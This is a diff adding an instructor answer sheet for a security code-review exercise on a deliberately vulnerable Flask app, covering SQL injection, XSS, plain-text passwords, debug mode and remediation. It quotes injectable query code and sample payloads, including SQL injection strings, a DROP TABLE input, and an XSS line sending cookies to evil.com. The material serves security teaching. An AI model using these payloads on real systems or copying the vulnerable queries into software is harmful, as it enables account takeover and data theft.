@@ -1,0 +1,407 @@
+# Manual Code Review Exercise - Answer Sheet
+
+## 🎯 Complete Solutions and Explanations
+
+This answer sheet provides detailed solutions for instructors to reference
+during the manual code review exercise.
+
+---
+
+## 📋 Exercise 1: Application Discovery - ANSWERS
+
+### 1.1 Application Structure Analysis
+
+**Files found in the application:**
+
+- ✅ main.py - Main Flask application entry point
+- ✅ user_management.py - Database operations and user handling
+- ✅ templates/ directory - HTML frontend templates
+- ✅ database_files/ directory - SQLite database storage
+- ✅ requirements.txt - Python package dependencies
+
+### 1.2 Application Components Understanding
+
+| File/Directory       | Purpose                  | Main Functions                                              |
+| -------------------- | ------------------------ | ----------------------------------------------------------- |
+| `main.py`            | **Main web application** | Route handling, request processing, Flask app configuration |
+| `user_management.py` | **Database operations**  | insertUser, retrieveUsers, insertFeedback, listFeedback     |
+| `templates/`         | **User interface**       | HTML templates for login, signup, success pages             |
+| `database_files/`    | **Data storage**         | SQLite database files for users and feedback                |
+
+### 1.3 Initial Code Exploration
+
+**Key observations about the application:**
+
+1. **What web framework is being used?** **Flask** (Python web framework)
+2. **How many routes does the application have?** **3 main routes** (/,
+   /signup.html, /success.html)
+3. **What HTTP methods are supported?** **GET, POST, PUT, PATCH, DELETE**
+   (overly permissive)
+
+---
+
+## 📋 Exercise 2: Authentication Security Review - ANSWERS
+
+### 2.1 User Login Process Analysis
+
+1. **How are usernames checked against the database?** **Answer:** Using string
+   formatting in SQL query:
+   `f"SELECT * FROM users WHERE username = '{username}'"` **🚨 This is
+   VULNERABLE to SQL injection**
+
+2. **How are passwords verified?** **Answer:** Separate SQL query:
+   `f"SELECT * FROM users WHERE password = '{password}'"` **🚨 This is ALSO
+   vulnerable to SQL injection AND creates authentication bypass opportunity**
+
+3. **What SQL query pattern is used for user lookup?**
+   ```sql
+   SELECT * FROM users WHERE username = '[USER_INPUT]'
+   SELECT * FROM users WHERE password = '[USER_INPUT]'
+   ```
+
+### 2.2 Authentication Vulnerability Assessment
+
+1. **Is the SQL query construction secure? Why or why not?** **Answer:** **NO -
+   Uses string formatting instead of parameterized queries. This allows SQL
+   injection attacks where attackers can modify the SQL query structure.**
+
+2. **What could happen if someone entered unusual characters in the username
+   field?** **Answer:** **SQL injection attack. Example: username =
+   `admin' OR '1'='1' --` would bypass authentication by making the query always
+   return true.**
+
+3. **Could an attacker bypass authentication? How?** **Answer:** **YES -
+   Multiple ways:**
+   - **SQL injection in username or password fields**
+   - **Logic bypass: separate username/password checks allow mixed credential
+     attacks**
+   - **Example: Use real username + any password with SQL injection**
+
+### 2.3 Password Security Review
+
+1. **How are passwords stored in the database?** **Answer:** ❌ **Plain text** -
+   No encryption, hashing, or other protection
+
+2. **What are the security implications of this password storage method?**
+   **Answer:** **CRITICAL security flaw:**
+   - **Anyone with database access can see all passwords**
+   - **If database is compromised, all user credentials are exposed**
+   - **No protection against insider threats**
+   - **Violates basic security principles and many compliance requirements**
+
+---
+
+## 📋 Exercise 3: SQL Injection Vulnerability Hunt - ANSWERS
+
+### 3.1 Database Query Analysis
+
+**Vulnerable Query #1:**
+
+- **Location:** `retrieveUsers` function, line ~13
+- **Code:** `cur.execute(f"SELECT * FROM users WHERE username = '{username}'")`
+- **Why vulnerable:** String formatting allows SQL injection
+- **Attack example:** `username = "admin' OR '1'='1' --"`
+
+**Vulnerable Query #2:**
+
+- **Location:** `retrieveUsers` function, line ~17
+- **Code:** `cur.execute(f"SELECT * FROM users WHERE password = '{password}'")`
+- **Why vulnerable:** String formatting allows SQL injection
+- **Attack example:** `password = "anything' OR '1'='1' --"`
+
+**Vulnerable Query #3:**
+
+- **Location:** `insertFeedback` function
+- **Code:**
+  `cur.execute(f"INSERT INTO feedback (feedback) VALUES ('{feedback}')")`
+- **Why vulnerable:** String formatting in INSERT statement
+- **Attack example:** `feedback = "test'); DROP TABLE users; --"`
+
+**Additional Vulnerability:**
+
+- **Authentication Logic Flaw:** Separate username and password queries allow
+  authentication bypass
+
+### 3.2 SQL Injection Impact Assessment
+
+1. **Username lookup vulnerability could allow:**
+
+   - ✅ **Reading other users' data**
+   - ✅ **Modifying database records**
+   - ✅ **Deleting user accounts**
+   - ✅ **Administrative access**
+
+2. **Password check vulnerability could allow:**
+   - ✅ **Authentication bypass**
+   - ✅ **Access to any user account**
+   - ✅ **Administrative privileges**
+   - ✅ **Data theft**
+
+### 3.3 SQL Injection Remediation
+
+**Secure Query Pattern:**
+
+```python
+# Instead of: cur.execute(f"SELECT * FROM users WHERE username = '{username}'")
+# Use: cur.execute("SELECT * FROM users WHERE username = ?", (username,))
+```
+
+**Why is this pattern more secure?** **Answer:** **Parameterized queries
+separate SQL code from data. The database treats user input as data only, never
+as executable SQL code, preventing injection attacks.**
+
+---
+
+## 📋 Exercise 4: Cross-Site Scripting (XSS) Analysis - ANSWERS
+
+### 4.1 Template Security Review
+
+**XSS Vulnerability #1:**
+
+- **Location:** `templates/index.html`
+- **Vulnerable code:** `{{ msg|safe }}`
+- **Why dangerous:** **The `|safe` filter disables HTML escaping, allowing
+  JavaScript injection**
+
+### 4.2 User Input Display Analysis
+
+**XSS Vulnerability #2:**
+
+- **Location:** `listFeedback` function in `user_management.py`
+- **How processed:** Direct HTML writing: `f.write(f"{row[1]}\n")`
+- **Why vulnerable:** **User feedback is written directly to HTML file without
+  escaping, enabling stored XSS attacks**
+
+### 4.3 XSS Attack Scenarios
+
+1. **Template XSS Attack Scenario:** **Answer:** **Attacker could pass
+   JavaScript in the `msg` parameter:**
+
+   - **URL:** `/?msg=<script>alert('XSS')</script>`
+   - **Result:** JavaScript executes in victim's browser
+   - **Impact:** Session theft, malicious redirects, defacement
+
+2. **Stored XSS Attack Scenario:** **Answer:** **Attacker submits malicious
+   feedback:**
+   - **Feedback:**
+     `<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>`
+   - **Result:** Every user viewing feedback page has their session stolen
+   - **Impact:** Persistent attack affecting all users
+
+---
+
+## 📋 Exercise 5: Business Logic Security Review - ANSWERS
+
+### 5.1 Authentication Logic Analysis
+
+1. **Does the authentication logic check username AND password together?**
+   **Answer:** ❌ **No, they are checked separately**
+
+2. **What happens if an attacker uses different usernames for each check?**
+   **Answer:** **Authentication bypass is possible. Attacker can:**
+
+   - **Use legitimate username with SQL injection in password field**
+   - **Use SQL injection in username field with any password**
+   - **Mix valid user credentials to gain unauthorized access**
+
+3. **Is there a timing attack vulnerability in the authentication process?**
+   **Answer:** **YES - The authentication process takes longer when usernames
+   exist vs. when they don't, revealing valid usernames to attackers.**
+
+### 5.2 Access Control Review
+
+1. **Are sensitive functions protected with authentication checks?** **Answer:**
+   ❌ **No, some routes are unprotected**
+
+2. **Can users access functionality they shouldn't?** **Answer:** **YES - No
+   proper session management or authorization checks on routes**
+
+### 5.3 Business Logic Vulnerabilities
+
+**Logic Flaw #1:**
+
+- **Description:** **Separate authentication queries**
+- **Location:** `retrieveUsers` function
+- **Impact:** **Complete authentication bypass**
+
+**Logic Flaw #2:**
+
+- **Description:** **Open redirect vulnerability**
+- **Location:** All routes accepting `url` parameter
+- **Impact:** **Phishing attacks and malicious redirects**
+
+---
+
+## 📋 Exercise 6: Error Handling and Information Disclosure - ANSWERS
+
+### 6.1 Error Message Analysis
+
+1. **What happens when database operations fail?** **Answer:** **Likely exposes
+   detailed database error messages to users**
+
+2. **Are detailed error messages shown to users?** **Answer:** **YES - Flask
+   debug mode and database errors can reveal sensitive information**
+
+3. **Could error messages help an attacker?** **Answer:** **YES - Database
+   structure, file paths, and internal application details**
+
+### 6.2 Debug Information Review
+
+1. **Is debug mode enabled?** **Answer:** ✅ **Yes** - `app.run(debug=True)` in
+   main.py
+
+2. **What information might be disclosed in debug mode?** **Answer:** **Stack
+   traces, source code, file paths, database queries, internal application
+   structure**
+
+---
+
+## 📋 Exercise 7: Comprehensive Vulnerability Documentation - ANSWERS
+
+### 7.1 Vulnerability Summary Table
+
+| Vulnerability Type       | Location                         | Risk Level   | Description                      | Remediation                 |
+| ------------------------ | -------------------------------- | ------------ | -------------------------------- | --------------------------- | -------- | ------------ |
+| **SQL Injection**        | user_management.py:13,17         | **Critical** | String formatting in SQL queries | Use parameterized queries   |
+| **Stored XSS**           | user_management.py:listFeedback  | **High**     | Unescaped HTML output            | HTML encode user content    |
+| **Reflected XSS**        | templates/index.html             | **High**     | `                                | safe` filter usage          | Remove ` | safe` filter |
+| **Auth Bypass**          | user_management.py:retrieveUsers | **High**     | Separate credential validation   | Single query validation     |
+| **Open Redirect**        | main.py:all routes               | **Medium**   | Unvalidated redirect parameter   | Validate redirect URLs      |
+| **Info Disclosure**      | main.py:debug=True               | **Medium**   | Debug mode enabled               | Disable debug in production |
+| **Weak Passwords**       | No password policy               | **Medium**   | No complexity requirements       | Implement password policy   |
+| **Plain Text Passwords** | Database storage                 | **Critical** | Passwords stored unhashed        | Hash passwords with bcrypt  |
+
+### 7.2 Risk Prioritization
+
+1. **Priority 1:** **SQL Injection vulnerabilities** **Justification:**
+   **Complete database compromise, data theft, system takeover**
+
+2. **Priority 2:** **Plain text password storage** **Justification:** **All user
+   credentials exposed if database compromised**
+
+3. **Priority 3:** **Authentication bypass vulnerability** **Justification:**
+   **Direct access to any user account**
+
+### 7.3 Executive Summary
+
+**Example Answer:** "The Unsecure PWA application contains multiple critical
+security vulnerabilities that pose significant risk to user data and system
+integrity. The most severe issues include SQL injection vulnerabilities allowing
+complete database compromise, plain text password storage exposing all user
+credentials, and authentication bypass mechanisms. Immediate remediation is
+required before any production deployment."
+
+---
+
+## 📋 Exercise 8: Professional Security Report - ANSWERS
+
+### 8.1 Detailed Vulnerability Report Example
+
+**Vulnerability Title:** **SQL Injection in User Authentication**
+
+**Severity:** **Critical**
+
+**Location:** `user_management.py`, `retrieveUsers` function, lines 13 and 17
+
+**Description:** The application uses string formatting to construct SQL queries
+for user authentication, allowing attackers to inject malicious SQL code and
+bypass authentication or extract sensitive data.
+
+**Technical Details:**
+
+```python
+# Vulnerable code:
+cur.execute(f"SELECT * FROM users WHERE username = '{username}'")
+cur.execute(f"SELECT * FROM users WHERE password = '{password}'")
+```
+
+**Proof of Concept:**
+
+```
+Username: admin' OR '1'='1' --
+Password: anything
+```
+
+**Business Impact:**
+
+- Complete authentication bypass
+- Access to all user accounts
+- Full database compromise
+- Potential data theft and system takeover
+
+**Recommended Fix:**
+
+```python
+# Secure implementation:
+cur.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
+```
+
+**Timeline for Fix:** **Immediate (within 24 hours)**
+
+---
+
+## 📊 Complete Risk Assessment
+
+### Vulnerability Priority Matrix
+
+| Vulnerability          | Severity | Exploitability | Business Impact | Priority |
+| ---------------------- | -------- | -------------- | --------------- | -------- |
+| SQL Injection          | Critical | Easy           | High            | 1        |
+| Plain Text Passwords   | Critical | Medium         | High            | 1        |
+| Authentication Bypass  | High     | Easy           | High            | 2        |
+| Stored XSS             | High     | Easy           | Medium          | 2        |
+| Reflected XSS          | High     | Easy           | Medium          | 3        |
+| Open Redirect          | Medium   | Easy           | Low             | 4        |
+| Information Disclosure | Medium   | Easy           | Low             | 4        |
+
+### Remediation Timeline
+
+**Phase 1 (Immediate - 24-48 hours):**
+
+- ✅ Fix SQL injection vulnerabilities
+- ✅ Implement password hashing
+- ✅ Disable debug mode
+
+**Phase 2 (Short-term - 1 week):**
+
+- ✅ Fix XSS vulnerabilities
+- ✅ Implement proper authentication logic
+- ✅ Add input validation
+
+**Phase 3 (Long-term - 1 month):**
+
+- ✅ Implement comprehensive security headers
+- ✅ Add proper error handling
+- ✅ Implement security logging and monitoring
+
+---
+
+## 🎓 Teaching Notes for Instructors
+
+### Key Points to Emphasize
+
+1. **Systematic Approach**: Students should follow a methodical review process
+2. **Context Matters**: Understanding business logic is crucial for finding
+   logical flaws
+3. **Think Like an Attacker**: Question every assumption and input
+4. **Documentation**: Professional reporting is as important as finding
+   vulnerabilities
+
+### Common Student Mistakes
+
+1. **Rushing through code**: Encourage careful, systematic reading
+2. **Missing context**: Help students understand the bigger picture
+3. **Focusing only on technical issues**: Emphasize business impact assessment
+4. **Poor documentation**: Stress the importance of clear, actionable reports
+
+### Extension Activities
+
+1. **Advanced students**: Have them design secure implementations
+2. **Struggling students**: Provide more guided discovery questions
+3. **All students**: Research real-world examples of vulnerabilities found
+
+---
+
+**🔍 This answer sheet provides comprehensive solutions to help instructors
+effectively guide students through the manual code review process and ensure
+learning objectives are met.**
